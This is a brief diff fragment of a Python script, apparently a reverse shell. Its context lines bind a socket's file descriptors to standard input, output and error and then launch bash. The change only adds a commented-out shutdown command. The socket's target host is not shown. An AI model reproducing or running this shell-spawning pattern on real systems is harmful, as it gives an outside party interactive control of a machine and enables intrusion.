@@ -5,7 +5,7 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 #import subprocess
-
+#shutdown /s
 
 
 subprocess = subprocess.Popen(["bash"], stdin=None, stdout=None, stderr=None, close_fds=True)
